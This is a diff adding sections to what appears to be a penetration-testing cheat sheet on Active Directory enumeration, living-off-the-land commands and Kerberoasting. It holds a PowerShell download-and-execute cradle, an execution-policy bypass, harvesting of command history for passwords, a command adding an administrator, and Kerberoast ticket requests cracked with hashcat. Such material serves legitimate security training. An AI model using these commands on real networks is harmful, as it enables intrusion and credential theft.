@@ -543,3 +543,321 @@ windapsearch - Privileged Users:
 windapsearch.py --dc-ip {IP} -u {USER}@{DOMAIN} -p {PASS} -PU
 ```
 
+## Credentialed Enumeration - from Windows
+
+**Tools:**
+
+- [Active Directory Powershell Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
+- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
+- SharpView.exe
+- [Snaffler](https://github.com/SnaffCon/Snaffler)
+- BloodHound
+- SharpHound
+
+**Commands:**
+
+Get-Module (Discover Modules):
+
+```powershell
+Get-Module
+```
+
+Load ActiveDirectory Module:
+
+```powershell
+Import-Module ActiveDirectory
+```
+
+Get-ADDomain (Get Domain Info):
+
+```powershell
+Get-ADDomain
+```
+
+Get-ADUser (Get AD users):
+
+**NOTE:** We will be filtering for accounts with the `ServicePrincipalName` property populated.
+
+```powershell
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
+
+ Get-ADTrust (verify domain trust relationships): 
+
+```powershell
+Get-ADTrust -Filter *
+```
+
+Get-ADGroup (Get AD Groups):
+
+```powershell
+Get-ADGroup -Filter * | select name
+```
+
+Get-ADGroup (Get detailed group info):
+
+```powershell
+Get-ADGroup -Identity "{GROUP}"
+```
+
+Get-ADGroupMember (Get group members):
+
+```powershell
+Get-ADGroupMember -Identity "{GROUP}"
+```
+
+Get-DomainUser (Get information on all users or specific users we specify):
+
+```powershell
+Get-DomainUser -Identity {USER} -Domain {DOMAIN} | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+```
+
+Get-DomainUser - SPN (check for users with the SPN attribute set):
+
+```powershell
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+```
+
+Get-DomainGroupMember (Get group members):
+
+**NOTE:** Use `-Recurse` to do a recursive search.
+
+```powershell
+Get-DomainGroupMember -Identity "{GROUP}" -Recurse
+```
+
+Get-DomainTrustMapping (verify domain trust relationships):
+
+```powershell
+Get-DomainTrustMapping
+```
+
+Test-AdminAccess (function to test for local admin access on either the current machine or a remote one)
+
+```powershell
+Test-AdminAccess -ComputerName {COMPUTER}
+```
+
+SharpView.exe:
+
+```powershell
+SharpView.exe {FUNCTION} -Help
+Example: .\SharpView.exe Get-DomainUser -Help
+```
+
+SharpView.exe - Get-DomainUser:
+
+```powershell
+SharpView.exe Get-DomainUser -Identity {USER}
+```
+
+Snaffler.exe:
+
+```powershell
+.\Snaffler.exe -s -d {DOMAIN} -o snaffler.log -v data
+```
+
+SharpHound.exe - No credentials:
+
+```powershell
+.\SharpHound.exe -c All --zipfilename bloodhound.zip
+```
+
+**PowerView - Most useful functions:**
+
+| **Command**                         | **Description**                                              |
+| ----------------------------------- | ------------------------------------------------------------ |
+| `Export-PowerViewCSV `              | Append results to a CSV file                                 |
+| `ConvertTo-SID`                     | Convert a User or group name to its SID value                |
+| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account |
+| **Domain/LDAP Functions:**          |                                                              |
+| `Get-Domain`                        | Will return the AD object for the current (or specified) domain |
+| `Get-DomainController`              | Return a list of the Domain Controllers for the specified domain |
+| `Get-DomainUser`                    | Will return all users or specific user objects in AD         |
+| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD |
+| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD       |
+| `Get-DomainOU`                      | Search for all or specific OU objects in AD                  |
+| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects |
+| `Get-DomainGroupMember `            | Will return the members of a specific domain group           |
+| `Get-DomainFileServer `             | Returns a list of servers likely functioning as file servers |
+| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain |
+| **GPO Functions:**                  |                                                              |
+| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD           |
+| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain |
+| **Computer Enumeration Functions:** |                                                              |
+| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine     |
+| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                 |
+| `Get-NetShare `                     | Returns open shares on the local (or a remote) machine       |
+| `Get-NetSession`                    | Will return session information for the local (or a remote) machine |
+| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine |
+| **Threaded 'Meta'-Functions:**      |                                                              |
+| `Find-DomainUserLocation`           | Finds machines where specific users are logged in            |
+| `Find-DomainShare`                  | Finds reachable shares on domain machines                    |
+| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain |
+| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access |
+| **Domain Trust Functions:**         |                                                              |
+| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain |
+| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest |
+| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain |
+| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
+| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen. |
+
+## Living Off the Land
+
+**Commands:**
+
+systeminfo:
+
+```cmd
+systeminfo
+```
+
+Powershell.exe - Downgrade:
+
+```powershell
+powershell.exe -version 2
+```
+
+netsh - Firewall Checks:
+
+```powershell
+netsh advfirewall show allprofiles
+```
+
+sc query - Windows Defender Check:
+
+```cmd
+sc query windefend
+```
+
+Get-MpComputerStatus - Windows Defender Check:
+
+```powershell
+Get-MpComputerStatus
+```
+
+qwinsta - Check users logged in:
+
+```cmd
+qwinsta
+```
+
+dsquery - User Search:
+
+```powershell
+dsquery user
+```
+
+dsquery - Computer Search:
+
+```powershell
+dsquery computer
+```
+
+#### Basic Enumeration Commands
+
+| **Command**                                             | **Result**                                                   |
+| ------------------------------------------------------- | ------------------------------------------------------------ |
+| `hostname`                                              | Prints the PC's Name                                         |
+| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                 |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host          |
+| `ipconfig /all`                                         | Prints out network adapter state and configurations          |
+| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt) |
+| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt) |
+| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
+| `systmeinfo`                                            | Print a summary of the host's information                    |
+
+#### Harnessing PowerShell
+
+| **Cmd-Let**                                                  | **Description**                                              |
+| ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `Get-Module`                                                 | Lists available modules loaded for use.                      |
+| `Get-ExecutionPolicy -List`                                  | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host. |
+| `Set-ExecutionPolicy Bypass -Scope Process`                  | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process  or terminate it. This is ideal because we won't be making a permanent  change to the victim host. |
+| `Get-ChildItem Env: | ft Key,Value`                          | Return environment values such as key paths, users, computer information, etc. |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | With this string, we can get the specified user's PowerShell  history. This can be quite helpful as the command history may contain  passwords or point us towards configuration files or scripts that  contain passwords. |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |
+
+#### Network Information
+
+| **Networking Commands**              | **Description**                                              |
+| ------------------------------------ | ------------------------------------------------------------ |
+| `arp -a `                            | Lists all known hosts stored in the arp table.               |
+| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here. |
+| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
+| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |
+
+#### Quick WMI checks
+
+| **Command**                                                  | **Description**                                              |
+| ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn`      | Prints the patch level and description of the Hotfixes applied |
+| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list |
+| `wmic process list /format:list`                             | A listing of all processes on host                           |
+| `wmic ntdomain list /format:list`                            | Displays information about the Domain and Domain Controllers |
+| `wmic useraccount list /format:list`                         | Displays information about all local accounts and any domain accounts that have logged into the device |
+| `wmic group list /format:list`                               | Information about all local groups                           |
+| `wmic sysaccount list /format:list`                          | Dumps information about any system accounts that are being used as service accounts. |
+
+#### Table of Useful Net Commands
+
+| **Command**                                     | **Description**                                              |
+| ----------------------------------------------- | ------------------------------------------------------------ |
+| `net accounts`                                  | Information about password requirements                      |
+| `net accounts /domain`                          | Password and lockout policy                                  |
+| `net group /domain`                             | Information about domain groups                              |
+| `net group "Domain Admins" /domain`             | List users with domain admin privileges                      |
+| `net group "domain computers" /domain`          | List of PCs connected to the domain                          |
+| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                      |
+| `net group <domain_group_name> /domain`         | User that belongs to the group                               |
+| `net groups /domain`                            | List of domain groups                                        |
+| `net localgroup`                                | All available groups                                         |
+| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
+| `net localgroup Administrators`                 | Information about a group (admins)                           |
+| `net localgroup administrators [username] /add` | Add user to administrators                                   |
+| `net share`                                     | Check current shares                                         |
+| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain               |
+| `net user /domain`                              | List all users of the domain                                 |
+| `net user %username%`                           | Information about the current user                           |
+| `net use x: \computer\share`                    | Mount the share locally                                      |
+| `net view`                                      | Get a list of computers                                      |
+| `net view /all /domain[:domainname]`            | Shares on the domains                                        |
+| `net view \computer /ALL`                       | List shares of a computer                                    |
+| `net view /domain `                             | List of PCs of the domain                                    |
+
+# Cooking with Fire
+
+## Kerberoasting - from Linux
+
+**Tools:**
+
+- [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
+- [NetExec](https://github.com/Pennyw0rth/NetExec)
+- hashcat
+
+**Commands:**
+
+GetUserSPNs.py - All users:
+
+```bash
+GetUserSPNs.py '{DOMAIN}/{USER}:{PASS}' -dc-ip {IP} -request -outputfile kerberoasting.txt
+```
+
+GetUserSPNs.py - Single user:
+
+```bash
+GetUserSPNs.py '{DOMAIN}/{USER}:{PASS}' -dc-ip {IP} -request-user {USER} -outputfile kerberoasting.txt
+```
+
+Netexec:
+
+```bash
+nxc ldap {IP} -u {USER} -p {PASS} --kerberoasting output.txt
+```
+
+hashcat:
+
+```bash
+hashcat -m 13100 kerberoasting.txt {WORDLIST}
+```
+
